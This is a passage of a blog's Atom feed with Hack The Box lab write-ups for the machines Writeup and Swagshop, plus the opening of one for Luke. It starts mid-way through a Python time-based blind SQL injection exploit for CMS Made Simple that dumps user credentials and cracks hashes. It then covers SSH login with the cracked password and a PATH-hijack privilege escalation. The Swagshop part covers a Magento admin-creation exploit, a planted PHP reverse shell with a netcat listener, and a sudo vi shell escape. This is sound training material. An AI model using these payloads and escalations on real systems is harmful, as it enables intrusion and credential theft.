&lt;&#x2F;span&gt;&lt;span&gt;            payload = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;a,b,1,5))+and+(select+sleep(&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; + &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;TIME&lt;&#x2F;span&gt;&lt;span&gt;) + &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;)+from+cms_users+where+username+like+0x&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; + ord_db_name_temp + &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;25+and+user_id+like+0x31)+--+&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;            url = url_vuln + &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;amp;m1_idlist=&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; + payload
&lt;&#x2F;span&gt;&lt;span&gt;            start_time = time.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;time&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;            r = session.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;get&lt;&#x2F;span&gt;&lt;span&gt;(url)
&lt;&#x2F;span&gt;&lt;span&gt;            elapsed_time = time.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;time&lt;&#x2F;span&gt;&lt;span&gt;() - start_time
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;elapsed_time &amp;gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;TIME&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;                flag = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;True
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;break
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;flag:
&lt;&#x2F;span&gt;&lt;span&gt;            db_name = temp_db_name
&lt;&#x2F;span&gt;&lt;span&gt;            ord_db_name = ord_db_name_temp
&lt;&#x2F;span&gt;&lt;span&gt;    output += &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[+] Username found: &lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; + db_name
&lt;&#x2F;span&gt;&lt;span&gt;    flag = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;True
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;dump_email&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;global &lt;&#x2F;span&gt;&lt;span&gt;flag
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;global &lt;&#x2F;span&gt;&lt;span&gt;email
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;global &lt;&#x2F;span&gt;&lt;span&gt;output
&lt;&#x2F;span&gt;&lt;span&gt;    ord_email = &amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    ord_email_temp = &amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span&gt;flag:
&lt;&#x2F;span&gt;&lt;span&gt;        flag = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;False
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(dictionary)):
&lt;&#x2F;span&gt;&lt;span&gt;            temp_email = email + dictionary[i]
&lt;&#x2F;span&gt;&lt;span&gt;            ord_email_temp = ord_email + &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;ord&lt;&#x2F;span&gt;&lt;span&gt;(dictionary[i]))[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;:]
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;beautify_print_try&lt;&#x2F;span&gt;&lt;span&gt;(temp_email)
&lt;&#x2F;span&gt;&lt;span&gt;            payload = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;a,b,1,5))+and+(select+sleep(&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; + &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;TIME&lt;&#x2F;span&gt;&lt;span&gt;) + &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;)+from+cms_users+where+email+like+0x&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; + ord_email_temp + &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;25+and+user_id+like+0x31)+--+&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;            url = url_vuln + &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;amp;m1_idlist=&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; + payload
&lt;&#x2F;span&gt;&lt;span&gt;            start_time = time.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;time&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;            r = session.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;get&lt;&#x2F;span&gt;&lt;span&gt;(url)
&lt;&#x2F;span&gt;&lt;span&gt;            elapsed_time = time.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;time&lt;&#x2F;span&gt;&lt;span&gt;() - start_time
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;elapsed_time &amp;gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;TIME&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;                flag = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;True
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;break
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;flag:
&lt;&#x2F;span&gt;&lt;span&gt;            email = temp_email
&lt;&#x2F;span&gt;&lt;span&gt;            ord_email = ord_email_temp
&lt;&#x2F;span&gt;&lt;span&gt;    output += &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[+] Email found: &lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; + email
&lt;&#x2F;span&gt;&lt;span&gt;    flag = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;True
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;dump_salt&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;dump_username&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;dump_email&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;dump_password&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;options.cracking:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;colored&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[*] Now try to crack password&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;crack_password&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;beautify_print&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Execute the exploit script:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;python cmsmadesimple22-sql.py -u http:&#x2F;&#x2F;10.10.10.138&#x2F;writeup
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-writeup&#x2F;htb-writeup-pythonhash.png&quot; alt=&quot;htb-writeup-pythonhash&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;As you can see, the result isn&#x27;t proper, it&#x27;s missing some characters. Another adjustment to the script was the TIME parameter. Adjusting the time to a sleep a few more seconds produced accurate results.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;I wonder what the hashes mean. I used hashkiller and other online hash sites and no results showed up.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;# hash-identifier
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;HASH: 5a599ef579066807
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Possible Hashs:
&lt;&#x2F;span&gt;&lt;span&gt;[+]  MySQL
&lt;&#x2F;span&gt;&lt;span&gt;[+]  MD5(Middle)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Least Possible Hashs:
&lt;&#x2F;span&gt;&lt;span&gt;[+]  MD5(Half)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;   -------------------------------------------------------------------------
&lt;&#x2F;span&gt;&lt;span&gt; HASH: 62def4866937f08cc13bab43bb14e6f7
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Possible Hashs:
&lt;&#x2F;span&gt;&lt;span&gt;[+]  MD5
&lt;&#x2F;span&gt;&lt;span&gt;[+]  Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Surprisingly, the exploit script also included the function to brute force the hash using a dictionary file of your choice. I used &lt;code&gt;rockyou.txt&lt;&#x2F;code&gt; and executed the script again:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;python cmsmadesimple22-sql.py -u http:&#x2F;&#x2F;10.10.10.138&#x2F;writeup --c -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-writeup&#x2F;htb-writeup-passwordcrack.png&quot; alt=&quot;htb-writeup-passwordcrack&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I found the password! Now how do I log in? I remembered that SSH was opened so I tried that since we have the username as well.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;ssh jkr@writeup
&lt;&#x2F;span&gt;&lt;span&gt;password: raykayjay9
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;User flag has been obtained.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h3 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;&#x2F;h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;This is where it got hard for me. Running &lt;code&gt;LinEnum&lt;&#x2F;code&gt; and &lt;code&gt;linuxprivchecker&lt;&#x2F;code&gt; scripts didn&#x27;t produce results that lead to privesc, more like rabbit holes of trying to manipulate PATH to run &lt;code&gt;&#x2F;etc&#x2F;update-motd&#x2F;10-uname&lt;&#x2F;code&gt; script.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;After reading some hints for this machine, there is a &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;DominicBreuker&#x2F;pspy&quot;&gt;pspy tool&lt;&#x2F;a&gt; that I had to use to watch processes that are being spawned after someone logs into the machine via ssh. The problem is I have a VIP subscription and there isn&#x27;t much traffic to monitor to spot the anomaly that I was suppose to look for. I ran the &lt;code&gt;pspy&lt;&#x2F;code&gt; for 3 days and see I would catch something in the logs. Nope, all I saw that stood out was this line:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;sh -c &#x2F;usr&#x2F;bin&#x2F;env -i PATH=&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin run-parts --lsbsysinit &#x2F;etc&#x2F;update-motd.d &amp;gt; &#x2F;run&#x2F;motd.dynamic.new
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;bin&#x2F;sh &#x2F;usr&#x2F;local&#x2F;sbin&#x2F;run-parts --lsbsysinit &#x2F;etc&#x2F;update-motd.d
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;I got stuck on this problem for 2-3 days now and was annoyed that I know it was something simple. Then someone gave me a hint, wasn&#x27;t even a specific one about PATHs, it was a simple question of &amp;quot;how does PATH work?&amp;quot;. I stared at the logs again and something started to click.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-writeup&#x2F;htb-writeup-runpartspath.png&quot; alt=&quot;htb-writeup-runpartspath&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Notice that &lt;code&gt;run-parts&lt;&#x2F;code&gt; binary is located in &lt;code&gt;bin&lt;&#x2F;code&gt; directory which is the 3rd position of where PATH will start looking for the binary of the user&#x27;s current PATH.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-writeup&#x2F;htb-writeup-currentpath.png&quot; alt=&quot;htb-writeup-currentpath&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Knowing that, it&#x27;s a matter of creating a symbolic link in &lt;code&gt;&#x2F;usr&#x2F;local&#x2F;bin&lt;&#x2F;code&gt; with the name &lt;code&gt;run-parts&lt;&#x2F;code&gt; that contain a line of code that will read and output &lt;code&gt;root.txt&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;vi &#x2F;usr&#x2F;local&#x2F;bin&#x2F;test
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;cat &#x2F;root&#x2F;root.txt &#x2F;tmp&#x2F;rooted.txt
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;You won&#x27;t be able to read the &lt;code&gt;&#x2F;usr&#x2F;local&#x2F;bin&lt;&#x2F;code&gt; directory due to permissions but this doesn&#x27;t matter as long as we have write permissions.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Trigger the &lt;code&gt;run-parts&lt;&#x2F;code&gt; executable by logging into SSH in another session. Check the &lt;code&gt;&#x2F;tmp&#x2F;rooted.txt&lt;&#x2F;code&gt; for the flag.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;code&gt;Protip&lt;&#x2F;code&gt;{: .info }&lt;&#x2F;p&gt;
&lt;p&gt;I found this useful site: &lt;a href=&quot;https:&#x2F;&#x2F;explainshell.com&#x2F;&quot;&gt;https:&#x2F;&#x2F;explainshell.com&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Swagshop</title>
        <published>2019-09-28T00:00:00+00:00</published>
        <updated>2019-09-28T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/htb-swagshop/" type="text/html"/>
        <id>https://johntuyen.com/posts/htb-swagshop/</id>
        
        <content type="html">&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Initial scans show swagshop is hosting a web server on port 80. Upon investigation, it&#x27;s running Magento version 1.9x after digging deep into the xml files and cross referencing using Google.&lt;&#x2F;p&gt;
&lt;p&gt;Source file: &lt;a href=&quot;http:&#x2F;&#x2F;10.10.10.140&#x2F;skin&#x2F;frontend&#x2F;default&#x2F;default&#x2F;css&#x2F;styles.css&quot;&gt;http:&#x2F;&#x2F;10.10.10.140&#x2F;skin&#x2F;frontend&#x2F;default&#x2F;default&#x2F;css&#x2F;styles.css&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Version confirmation: &lt;a href=&quot;https:&#x2F;&#x2F;magento.stackexchange.com&#x2F;questions&#x2F;60476&#x2F;determine-magento-version-without-access-to-code-base&quot;&gt;https:&#x2F;&#x2F;magento.stackexchange.com&#x2F;questions&#x2F;60476&#x2F;determine-magento-version-without-access-to-code-base&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;I used &lt;code&gt;dirbuster&lt;&#x2F;code&gt; to dig into what other possible folders are accessible. &lt;code&gt;dirbuster&lt;&#x2F;code&gt; showed a number of accessible folders and the two that stood out was:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;http:&#x2F;&#x2F;swagshop&#x2F;downloader&#x2F;&quot;&gt;http:&#x2F;&#x2F;swagshop&#x2F;downloader&#x2F;&lt;&#x2F;a&gt; - Magento Downloader&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;http:&#x2F;&#x2F;swagshop&#x2F;index.php&#x2F;admin&quot;&gt;http:&#x2F;&#x2F;swagshop&#x2F;index.php&#x2F;admin&lt;&#x2F;a&gt; - Magento Admin Portal&lt;&#x2F;p&gt;
&lt;p&gt;I didn&#x27;t have much experience with Magento so I found the Downloader first. Brute forcing the username and password didn&#x27;t produce any results as I believe it banned my IP during my attempt.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;One thing I learned from the &lt;code&gt;dirbuster&lt;&#x2F;code&gt; results was that index.php can be searched as well using &lt;code&gt;dirbuster&lt;&#x2F;code&gt;. I received this hint through the HTB discord chat and I did not realize you can do this. I thought these two links are the same but it&#x27;s not:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;http:&#x2F;&#x2F;swagshop&#x2F;&quot;&gt;http:&#x2F;&#x2F;swagshop&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;http:&#x2F;&#x2F;swagshop&#x2F;index.php&quot;&gt;http:&#x2F;&#x2F;swagshop&#x2F;index.php&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;You will see next how this information is important.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;I started to search for possible Magento exploits on exploits-db. There are a lot of exploits to read through but most seem to be targeting version 2.0+. In addition, my mistake during my search on exploit-db was searching only verified exploits. I began to realize that unverified exploits also add to the missing pieces of this swagshop puzzle.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;37977&quot;&gt;https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;37977&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Pay attention to the index.php in the target variable. Without this part, you cannot exploit Magento. I was struggling with this part as mentioned above. It was an oversight on my end.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Once the script has been executed, it will create Magento admin credentials of &lt;code&gt;forme:forme&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Now I needed to find a way to edit files just like how you would on a Wordpress site. A quick Google search shows you can install plugins. This is great because now you can install a File Manager type plugin and make our life easier.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;pluginarchive.com&#x2F;magento&#x2F;magpleasure_filesystem&quot;&gt;https:&#x2F;&#x2F;pluginarchive.com&#x2F;magento&#x2F;magpleasure_filesystem&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Download and install the plugin using the Magento Downloader control panel.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-swagshop&#x2F;htb-swagbox-magento-filesystem.png&quot; alt=&quot;htb-swagbox-magento-filesystem&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Once activated, use the Magento Admin control panel and navigate to:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;System &amp;gt; Filesystem &amp;gt; IDE
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Modify the &lt;code&gt;errors&#x2F;503.php&lt;&#x2F;code&gt; with your own PHP reverse shell code and save the file.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-swagshop&#x2F;htb-swagshop-magento-reverseshell.png&quot; alt=&quot;htb-swagshop-magento-reverseshell&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Start netcat to catch reverse shell:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;nc -nvlp 4444
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Use firefox and navigate to &lt;a href=&quot;http:&#x2F;&#x2F;10.10.10.140&#x2F;errors&#x2F;503.php&quot;&gt;http:&#x2F;&#x2F;10.10.10.140&#x2F;errors&#x2F;503.php&lt;&#x2F;a&gt; and a reverse shell has been established. Obtain user flag.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h3 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;&#x2F;h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;After enumerating the machine using &lt;code&gt;LinEnum&lt;&#x2F;code&gt; script, I noticed the sudoers file has been misconfigured:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;User www-data may run the following commands on swagshop:
&lt;&#x2F;span&gt;&lt;span&gt;(root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;vi &#x2F;var&#x2F;www&#x2F;html&#x2F;*
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;This means sudo vi will work in &#x2F;var&#x2F;www&#x2F;html folder and you will obtain root flag.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;sudo vi &#x2F;var&#x2F;www&#x2F;html&#x2F;api.php
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;:sh
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-swagshop&#x2F;htb-swagshop-root.png&quot; alt=&quot;htb-swagshop-root&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Luke</title>
        <published>2019-09-14T00:00:00+00:00</published>
        <updated>2019-09-14T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/htb-luke/" type="text/html"/>
        <id>https://johntuyen.com/posts/htb-luke/</id>
        
        <content type="html">&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Port scans show TCP ports 21, 22, 80, 3000, 8000 are open.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The FTP service allows anonymous FTP access so I checked that out. It doesn&#x27;t contain any useful files besides a .txt file from a user about setting up a web server access for demonstration purposes.&lt;&#x2F;p&gt;
